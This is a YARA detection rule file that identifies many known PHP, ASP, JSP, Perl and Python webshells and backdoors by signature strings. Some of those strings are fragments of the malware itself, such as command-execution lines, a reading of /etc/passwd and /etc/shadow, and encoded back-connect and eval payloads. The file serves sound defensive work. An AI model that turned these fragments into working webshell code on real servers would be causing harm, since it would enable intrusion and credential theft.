rule sig_2008_php_php {
	meta:
		description = "Semi-Auto-generated  - file 2008.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "3e4ba470d4c38765e4b16ed930facf2c"
		id = "bfa3caa9-70a5-536b-a887-58427eee43df"
	strings:
		$s0 = "Codz by angel(4ngel)"
		$s1 = "Web: http://www.4ngel.net"
		$s2 = "$admin['cookielife'] = 86400;"
		$s3 = "$errmsg = 'The file you want Downloadable was nonexistent';"
	condition:
		1 of them
}
rule ak74shell_php_php {
	meta:
		description = "Semi-Auto-generated  - file ak74shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "7f83adcb4c1111653d30c6427a94f66f"
		id = "eaf243cb-fa26-5f34-a724-60a08acff636"
	strings:
		$s1 = "$res .= '<td align=\"center\"><a href=\"'.$xshell.'?act=chmod&file='.$_SESSION["
		$s2 = "AK-74 Security Team Web Site: www.ak74-team.net"
		$s3 = "$xshell"
	condition:
		2 of them
}
rule Rem_View_php_php {
	meta:
		description = "Semi-Auto-generated  - file Rem View.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "29420106d9a81553ef0d1ca72b9934d9"
		id = "6137434c-89e9-537b-9b26-b56178022b76"
	strings:
		$s0 = "$php=\"/* line 1 */\\n\\n// \".mm(\"for example, uncomment next line\").\""
		$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
		$s4 ="Welcome to phpRemoteView (RemView)"
	condition:
		1 of them
}
rule Java_Shell_js {
	meta:
		description = "Semi-Auto-generated  - file Java Shell.js.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "36403bc776eb12e8b7cc0eb47c8aac83"
		id = "eff52c3a-fc3a-5e80-8da9-786168159ebc"
	strings:
		$s2 = "PySystemState.initialize(System.getProperties(), null, argv);" fullword
		$s3 = "public class JythonShell extends JPanel implements Runnable {" fullword
		$s4 = "public static int DEFAULT_SCROLLBACK = 100"
	condition:
		2 of them
}
rule STNC_php_php {
	meta:
		description = "Semi-Auto-generated  - file STNC.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "2e56cfd5b5014cbbf1c1e3f082531815"
		id = "8a7167f6-fa62-574f-a37c-3ceadc7f92ec"
	strings:
		$s0 = "drmist.ru" fullword
		$s1 = "hidden(\"action\",\"download\").hidden_pwd().\"<center><table><tr><td width=80"
		$s2 = "STNC WebShell"
		$s3 = "http://www.security-teams.net/index.php?showtopic="
	condition:
		1 of them
}
rule aZRaiLPhp_v1_0_php {
	meta:
		description = "Semi-Auto-generated  - file aZRaiLPhp v1.0.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "26b2d3943395682e36da06ed493a3715"
		id = "60152b96-e8d3-5b06-a855-fb64a490742b"
	strings:
		$s0 = "azrailphp"
		$s1 = "<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>"
		$s3 = "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>"
	condition:
		2 of them
}
rule Moroccan_Spamers_Ma_EditioN_By_GhOsT_php {
	meta:
		description = "Semi-Auto-generated  - file Moroccan Spamers Ma-EditioN By GhOsT.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "d1b7b311a7ffffebf51437d7cd97dc65"
		id = "721d6e9f-a237-5462-a8d3-f838d7fda420"
	strings:
		$s0 = ";$sd98=\"john.barker446@gmail.com\""
		$s1 = "print \"Sending mail to $to....... \";"
		$s2 = "<td colspan=\"2\" width=\"715\" background=\"/simparts/images/cellpic1.gif\" hei"
	condition:
		1 of them
}
rule zacosmall_php {
	meta:
		description = "Semi-Auto-generated  - file zacosmall.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "5295ee8dc2f5fd416be442548d68f7a6"
		id = "25946aa7-7c56-5670-ae2f-c55e65a3b911"
	strings:
		$s0 = "rand(1,99999);$sj98"
		$s1 = "$dump_file.='`'.$rows2[0].'`"
		$s3 = "filename=\\\"dump_{$db_dump}_${table_d"
	condition:
		2 of them
}
rule CmdAsp_asp {
	meta:
		description = "Semi-Auto-generated  - file CmdAsp.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "64f24f09ec6efaa904e2492dffc518b9"
		id = "79e0ba85-ed4b-5909-a2fd-9b4125598078"
	strings:
		$s0 = "CmdAsp.asp"
		$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
		$s2 = "-- Use a poor man's pipe ... a temp file --"
		$s3 = "maceo @ dogmile.com"
	condition:
		2 of them
}
rule simple_backdoor_php {
	meta:
		description = "Semi-Auto-generated  - file simple-backdoor.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "f091d1b9274c881f8e41b2f96e6b9936"
		id = "5607f501-a750-59be-9595-5ac71ea6f74b"
	strings:
		$s0 = "$cmd = ($_REQUEST['cmd']);" fullword
		$s1 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->"
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
	condition:
		2 of them
}
rule mysql_shell_php {
	meta:
		description = "Semi-Auto-generated  - file mysql_shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "d42aec2891214cace99b3eb9f3e21a63"
		id = "e517984b-575c-5ead-a438-9767d2c74099"
	strings:
		$s0 = "SooMin Kim"
		$s1 = "smkim@popeye.snu.ac.kr"
		$s2 = "echo \"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen"
	condition:
		1 of them
}
rule Dive_Shell_1_0___Emperor_Hacking_Team_php {
	meta:
		description = "Semi-Auto-generated  - file Dive Shell 1.0 - Emperor Hacking Team.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "1b5102bdc41a7bc439eea8f0010310a5"
		id = "d75294a4-a0a7-5c74-bb7a-766db477633c"
	strings:
		$s0 = "Emperor Hacking TEAM"
		$s1 = "Simshell" fullword
		$s2 = "ereg('^[[:blank:]]*cd[[:blank:]]"
		$s3 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST"
	condition:
		2 of them
}
rule Asmodeus_v0_1_pl {
	meta:
		description = "Semi-Auto-generated  - file Asmodeus v0.1.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "0978b672db0657103c79505df69cb4bb"
		id = "cfd082a8-56fa-54bc-a683-c0052f78e12e"
	strings:
		$s0 = "[url=http://www.governmentsecurity.org"
		$s1 = "perl asmodeus.pl client 6666 127.0.0.1"
		$s2 = "print \"Asmodeus Perl Remote Shell"
		$s4 = "$internet_addr = inet_aton(\"$host\") or die \"ALOA:$!\\n\";" fullword
	condition:
		2 of them
}
rule backup_php_often_with_c99shell {
	meta:
		description = "Semi-Auto-generated  - file backup.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "aeee3bae226ad57baf4be8745c3f6094"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
	strings:
		$s0 = "#phpMyAdmin MySQL-Dump" fullword
		$s2 = ";db_connect();header('Content-Type: application/octetstr"
		$s4 = "$data .= \"#Database: $database" fullword
	condition:
		all of them
}
rule Reader_asp {
	meta:
		description = "Semi-Auto-generated  - file Reader.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "ad1a362e0a24c4475335e3e891a01731"
		id = "70094d24-fa3a-503c-b9b6-294a883fc52c"
	strings:
		$s1 = "Mehdi & HolyDemon"
		$s2 = "www.infilak."
		$s3 = "'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\"75%"
	condition:
		2 of them
}
rule phpshell17_php {
	meta:
		description = "Semi-Auto-generated  - file phpshell17.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "9a928d741d12ea08a624ee9ed5a8c39d"
		id = "ea1f657c-2023-50bb-a2ee-33c53ee8fb5e"
	strings:
		$s0 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword
		$s1 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></"
		$s2 = "href=\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>" fullword
	condition:
		1 of them
}
rule myshell_php_php {
	meta:
		description = "Semi-Auto-generated  - file myshell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "62783d1db52d05b1b6ae2403a7044490"
		id = "eaf243cb-fa26-5f34-a724-60a08acff636"
	strings:
		$s0 = "@chdir($work_dir) or ($shellOutput = \"MyShell: can't change directory."
		$s1 = "echo \"<font color=$linkColor><b>MyShell file editor</font> File:<font color"
		$s2 = " $fileEditInfo = \"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$"
	condition:
		2 of them
}
rule SimShell_1_0___Simorgh_Security_MGZ_php {
	meta:
		description = "Semi-Auto-generated  - file SimShell 1.0 - Simorgh Security MGZ.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "37cb1db26b1b0161a4bf678a6b4565bd"
		id = "51565555-a17b-59c7-b433-c3166fe0d7f0"
	strings:
		$s0 = "Simorgh Security Magazine "
		$s1 = "Simshell.css"
		$s2 = "} elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], "
		$s3 = "www.simorgh-ev.com"
	condition:
		2 of them
}
rule jspshall_jsp {
	meta:
		description = "Semi-Auto-generated  - file jspshall.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "efe0f6edaa512c4e1fdca4eeda77b7ee"
		id = "4bccad33-d26e-52c2-b7f8-802f2c8f3889"
	strings:
		$s0 = "kj021320"
		$s1 = "case 'T':systemTools(out);break;"
		$s2 = "out.println(\"<tr><td>\"+ico(50)+f[i].getName()+\"</td><td> file"
	condition:
		2 of them
}
rule webshell_php {
	meta:
		description = "Semi-Auto-generated  - file webshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "e425241b928e992bde43dd65180a4894"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "<die(\"Couldn't Read directory, Blocked!!!\");"
		$s3 = "PHP Web Shell"
	condition:
		all of them
}
rule rootshell_php {
	meta:
		description = "Semi-Auto-generated  - file rootshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "265f3319075536030e59ba2f9ef3eac6"
		id = "aec6621e-f23a-5f9f-91f1-d2f1b1ab58d0"
	strings:
		$s0 = "shells.dl.am"
		$s1 = "This server has been infected by $owner"
		$s2 = "<input type=\"submit\" value=\"Include!\" name=\"inc\"></p>"
		$s4 = "Could not write to file! (Maybe you didn't enter any text?)"
	condition:
		2 of them
}
rule connectback2_pl {
	meta:
		description = "Semi-Auto-generated  - file connectback2.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "473b7d226ea6ebaacc24504bd740822e"
		id = "4ddebc62-17d2-577e-84bd-207367078327"
	strings:
		$s0 = "#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   "
		$s1 = "echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel"
		$s2 = "ConnectBack Backdoor"
	condition:
		1 of them
}
rule DefaceKeeper_0_2_php {
	meta:
		description = "Semi-Auto-generated  - file DefaceKeeper_0.2.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "713c54c3da3031bc614a8a55dccd7e7f"
		id = "671323e2-42cb-5ce0-9839-5d01c446471c"
	strings:
		$s0 = "target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>" fullword
		$s1 = "eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9"
		$s2 = "<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center"
	condition:
		1 of them
}
rule shells_PHP_wso {
	meta:
		description = "Semi-Auto-generated  - file wso.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "33e2891c13b78328da9062fbfcf898b6"
		id = "fdce6094-a88e-5da6-aeb0-bc97b15bf397"
	strings:
		$s0 = "$back_connect_p=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi"
		$s3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos"
	condition:
		1 of them
}
rule backdoor1_php {
	meta:
		description = "Semi-Auto-generated  - file backdoor1.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "e1adda1f866367f52de001257b4d6c98"
		id = "89f44a1c-8a42-58f6-9308-371f4e652bff"
	strings:
		$s1 = "echo \"[DIR] <A HREF=\\\"\".$_SERVER['PHP_SELF'].\"?rep=\".realpath($rep.\".."
		$s2 = "class backdoor {"
		$s4 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?copy=1\\\">Copier un fichier</a> <"
	condition:
		1 of them
}
rule elmaliseker_asp {
	meta:
		description = "Semi-Auto-generated  - file elmaliseker.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "b32d1730d23a660fd6aa8e60c3dc549f"
		id = "7ecf3d5c-be91-579e-905b-5f2ad03a0e42"
	strings:
		$s0 = "if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\""
		$s1 = "<form name=frmCMD method=post action=\"<%=gURL%>\">"
		$s2 = "dim zombie_array,special_array"
		$s3 = "http://vnhacker.org"
	condition:
		1 of them
}
rule indexer_asp {
	meta:
		description = "Semi-Auto-generated  - file indexer.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "9ea82afb8c7070817d4cdf686abe0300"
		id = "84ff60f9-36f7-5d29-9f38-8088fb42582e"
	strings:
		$s0 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
		$s2 = "D7nD7l.km4snk`JzKnd{n_ejq;bd{KbPur#kQ8AAA==^#~@%>></td><td><input type=\"submit"
	condition:
		1 of them
}
rule DxShell_php_php {
	meta:
		description = "Semi-Auto-generated  - file DxShell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "33a2b31810178f4c2e71fbdeb4899244"
		id = "b89930b7-acf3-5078-8429-d59e27e4b00c"
	strings:
		$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s2 = "print \"\\n\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><"
	condition:
		1 of them
}
rule s72_Shell_v1_1_Coding_html {
	meta:
		description = "Semi-Auto-generated  - file s72 Shell v1.1 Coding.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "c2e8346a5515c81797af36e7e4a3828e"
		id = "dfd3b80e-6245-5f74-9d6a-6006218891ac"
	strings:
		$s0 = "Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><"
		$s1 = "s72 Shell v1.0 Codinf by Cr@zy_King"
		$s3 = "echo \"<p align=center>Dosya Zaten Bulunuyor</p>\""
	condition:
		1 of them
}
rule kacak_asp {
	meta:
		description = "Semi-Auto-generated  - file kacak.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "907d95d46785db21331a0324972dda8c"
		id = "1ae15174-b84a-5826-b768-7afed65196db"
	strings:
		$s0 = "Kacak FSO 1.0"
		$s1 = "if request.querystring(\"TGH\") = \"1\" then"
		$s3 = "<font color=\"#858585\">BuqX</font></a></font><font face=\"Verdana\" style="
		$s4 = "mailto:BuqX@hotmail.com"
	condition:
		1 of them
}
rule PHP_Backdoor_Connect_pl_php {
	meta:
		description = "Semi-Auto-generated  - file PHP Backdoor Connect.pl.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "57fcd9560dac244aeaf95fd606621900"
		id = "96c9258e-3894-5ee9-b52c-eb7ba7454416"
	strings:
		$s0 = "LorD of IRAN HACKERS SABOTAGE"
		$s1 = "LorD-C0d3r-NT"
		$s2 = "echo --==Userinfo==-- ;"
	condition:
		1 of them
}
rule Antichat_Socks5_Server_php_php {
	meta:
		description = "Semi-Auto-generated  - file Antichat Socks5 Server.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "cbe9eafbc4d86842a61a54d98e5b61f1"
		id = "35d0930c-ef07-5fd4-9d7a-c0d685f92339"
	strings:
		$s0 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);" fullword
		$s3 = "#   [+] Domain name address type"
		$s4 = "www.antichat.ru"
	condition:
		1 of them
}
rule Antichat_Shell_v1_3_php {
	meta:
		description = "Semi-Auto-generated  - file Antichat Shell v1.3.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "40d0abceba125868be7f3f990f031521"
		id = "856cf977-24da-58e0-b6d2-820c92075ecc"
	strings:
		$s0 = "Antichat"
		$s1 = "Can't open file, permission denide"
		$s2 = "$ra44"
	condition:
		2 of them
}
rule Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_php {
	meta:
		description = "Semi-Auto-generated  - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "49ad9117c96419c35987aaa7e2230f63"
		id = "3e81f628-31b4-5c22-943e-62c8cb4c0c4d"
	strings:
		$s0 = "Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy"
		$s1 = "Mode Shell v1.0</font></span>"
		$s2 = "has been already loaded. PHP Emperor <xb5@hotmail."
	condition:
		1 of them
}
rule mysql_php_php {
	meta:
		description = "Semi-Auto-generated  - file mysql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "12bbdf6ef403720442a47a3cc730d034"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
	strings:
		$s0 = "action=mysqlread&mass=loadmass\">load all defaults"
		$s2 = "if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru"
		$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = "
	condition:
		1 of them
}
rule Worse_Linux_Shell_php {
	meta:
		description = "Semi-Auto-generated  - file Worse Linux Shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8338c8d9eab10bd38a7116eb534b5fa2"
		id = "e223e2a9-7c7a-597a-8b90-a63ee11805ea"
	strings:
		$s1 = "print \"<tr><td><b>Server is:</b></td><td>\".$_SERVER['SERVER_SIGNATURE'].\"</td"
		$s2 = "print \"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\"_cmd"
	condition:
		1 of them
}
rule cyberlords_sql_php_php {
	meta:
		description = "Semi-Auto-generated  - file cyberlords_sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "03b06b4183cb9947ccda2c3d636406d4"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
	strings:
		$s0 = "Coded by n0 [nZer0]"
		$s1 = " www.cyberlords.net"
		$s2 = "U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE"
		$s3 = "return \"<BR>Dump error! Can't write to \".htmlspecialchars($file);"
	condition:
		1 of them
}
rule cmd_asp_5_1_asp {
	meta:
		description = "Semi-Auto-generated  - file cmd-asp-5.1.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8baa99666bf3734cbdfdd10088e0cd9f"
		id = "fc204ab8-892d-5435-a737-a185ca32e938"
	strings:
		$s0 = "Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)" fullword
		$s3 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
	condition:
		1 of them
}
rule pws_php_php {
	meta:
		description = "Semi-Auto-generated  - file pws.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "ecdc6c20f62f99fa265ec9257b7bf2ce"
		id = "1ec47c33-dbec-50bd-b4b0-8f00b704a816"
	strings:
		$s0 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>" fullword
		$s1 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>" fullword
		$s4 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>"
	condition:
		2 of them
}
rule PHP_Shell_php_php {
	meta:
		description = "Semi-Auto-generated  - file PHP Shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"
		id = "6978126c-5414-52d2-b085-6e5589716d93"
	strings:
		$s0 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
		$s1 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="
	condition:
		all of them
}
rule Ayyildiz_Tim___AYT__Shell_v_2_1_Biz_html {
	meta:
		description = "Semi-Auto-generated  - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8a8c8bb153bd1ee097559041f2e5cf0a"
		id = "d50a8669-fd28-59d2-9f00-f4fe2b85dc22"
	strings:
		$s0 = "Ayyildiz"
		$s1 = "TouCh By iJOo"
		$s2 = "First we check if there has been asked for a working directory"
		$s3 = "http://ayyildiz.org/images/whosonline2.gif"
	condition:
		2 of them
}
rule EFSO_2_asp {
	meta:
		description = "Semi-Auto-generated  - file EFSO_2.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "b5fde9682fd63415ae211d53c6bfaa4d"
		id = "f0566790-b41c-5167-b7ec-19e7d04256d1"
	strings:
		$s0 = "Ejder was HERE"
		$s1 = "*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~"
	condition:
		2 of them
}
rule lamashell_php {
	meta:
		description = "Semi-Auto-generated  - file lamashell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "de9abc2e38420cad729648e93dfc6687"
		id = "cbbb3377-ef9c-5fd1-a8b8-2b730fb5ef28"
	strings:
		$s0 = "lama's'hell" fullword
		$s1 = "if($_POST['king'] == \"\") {"
		$s2 = "if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\"/\".$_FILES['f"
	condition:
		1 of them
}
rule Ajax_PHP_Command_Shell_php {
	meta:
		description = "Semi-Auto-generated  - file Ajax_PHP Command Shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "93d1a2e13a3368a2472043bd6331afe9"
		id = "cae2e035-ae7b-589b-b2d9-e709028274c5"
	strings:
		$s1 = "newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>"
		$s2 = "Empty Command..type \\\"shellhelp\\\" for some ehh...help"
		$s3 = "newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct"
	condition:
		1 of them
}
rule JspWebshell_1_2_jsp {
	meta:
		description = "Semi-Auto-generated  - file JspWebshell 1.2.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "70a0ee2624e5bbe5525ccadc467519f6"
		id = "edfe6a3d-7d56-52ad-a376-cec5722e87b7"
	strings:
		$s0 = "JspWebshell"
		$s1 = "CreateAndDeleteFolder is error:"
		$s2 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.c"
		$s3 = "String _password =\"111\";"
	condition:
		2 of them
}
rule Sincap_php_php {
	meta:
		description = "Semi-Auto-generated  - file Sincap.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "b68b90ff6012a103e57d141ed38a7ee9"
		id = "8c4dc7b1-94ce-5528-8442-eae05d2c9980"
	strings:
		$s0 = "$baglan=fopen(\"/tmp/$ekinci\",'r');"
		$s2 = "$tampon4=$tampon3-1"
		$s3 = "@aventgrup.net"
	condition:
		2 of them
}
rule Test_php_php {
	meta:
		description = "Semi-Auto-generated  - file Test.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "77e331abd03b6915c6c6c7fe999fcb50"
		id = "58d73264-6507-5560-ad3e-0cc86c2ee291"
	strings:
		$s0 = "$yazi = \"test\" . \"\\r\\n\";" fullword
		$s2 = "fwrite ($fp, \"$yazi\");" fullword
		$s3 = "$entry_line=\"HACKed by EntriKa\";" fullword
	condition:
		1 of them
}
rule Phyton_Shell_py {
	meta:
		description = "Semi-Auto-generated  - file Phyton Shell.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "92b3c897090867c65cc169ab037a0f55"
		id = "2f55d60d-94f3-508d-a2d0-5ab59e3fdab3"
	strings:
		$s1 = "sh_out=os.popen(SHELL+\" \"+cmd).readlines()" fullword
		$s2 = "#   d00r.py 0.3a (reverse|bind)-shell in python by fQ" fullword
		$s3 = "print \"error; help: head -n 16 d00r.py\"" fullword
		$s4 = "print \"PW:\",PW,\"PORT:\",PORT,\"HOST:\",HOST" fullword
	condition:
		1 of them
}
rule mysql_tool_php_php {
	meta:
		description = "Semi-Auto-generated  - file mysql_tool.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "5fbe4d8edeb2769eda5f4add9bab901e"
		id = "c67197d1-6e40-5bf2-9e1b-6ada43529435"
	strings:
		$s0 = "$error_text = '<strong>Failed selecting database \"'.$this->db['"
		$s1 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERV"
		$s4 = "<div align=\"center\">The backup process has now started<br "
	condition:
		1 of them
}
rule Zehir_4_asp {
	meta:
		description = "Semi-Auto-generated  - file Zehir 4.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "7f4e12e159360743ec016273c3b9108c"
		id = "ea7df4e1-d4e2-5a58-a014-d12cb9afaf79"
	strings:
		$s2 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time="
		$s4 = "<input type=submit value=\"Test Et!\" onclick=\""
	condition:
		1 of them
}
rule sh_php_php {
	meta:
		description = "Semi-Auto-generated  - file sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "330af9337ae51d0bac175ba7076d6299"
		id = "da691516-d6c9-5c4b-85c3-f1cd7fc96ae7"
	strings:
		$s1 = "$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e"
		$s2 = "Show <input type=text size=5 value=\".((isset($_POST['br_st']))?$_POST['br_st']:"
	condition:
		1 of them
}
rule phpbackdoor15_php {
	meta:
		description = "Semi-Auto-generated  - file phpbackdoor15.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "0fdb401a49fc2e481e3dfd697078334b"
		id = "a93b881b-3050-5f43-803c-4a571aaaef82"
	strings:
		$s1 = "echo \"fichier telecharge dans \".good_link(\"./\".$_FILES[\"fic\"][\"na"
		$s2 = "if(move_uploaded_file($_FILES[\"fic\"][\"tmp_name\"],good_link(\"./\".$_FI"
		$s3 = "echo \"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s"
	condition:
		1 of them
}
rule phpjackal_php {
	meta:
		description = "Semi-Auto-generated  - file phpjackal.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "ab230817bcc99acb9bdc0ec6d264d76f"
		id = "ae46cb97-1ff8-50ba-856f-c38fbb1e5163"
	strings:
		$s3 = "$dl=$_REQUEST['downloaD'];"
		$s4 = "else shelL(\"perl.exe $name $port\");"
	condition:
		1 of them
}
rule sql_php_php {
	meta:
		description = "Semi-Auto-generated  - file sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8334249cbb969f2d33d678fec2b680c5"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
	strings:
		$s1 = "fputs ($fp, \"# RST MySQL tools\\r\\n# Home page: http://rst.void.ru\\r\\n#"
		$s2 = "http://rst.void.ru"
		$s3 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"
	condition:
		1 of them
}
rule cgi_python_py {
	meta:
		description = "Semi-Auto-generated  - file cgi-python.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "0a15f473e2232b89dae1075e1afdac97"
		id = "75e99d10-3cdf-5f87-9933-4ce5ebe18b09"
